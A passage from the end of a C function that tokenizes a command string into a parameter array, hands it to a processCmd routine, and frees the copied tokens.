memset(params[paramsCount], 0, strlen(pch) + 1);
strcpy(params[paramsCount], pch);
paramsCount++;
}
pch = strtok(NULL, " ");
}
processCmd(paramsCount, params);
if(paramsCount > 1)
{
int q = 1;
for(q = 1; q < paramsCount; q++)
{
free(params[q]);
}
}
}
}
}
return 0;
}
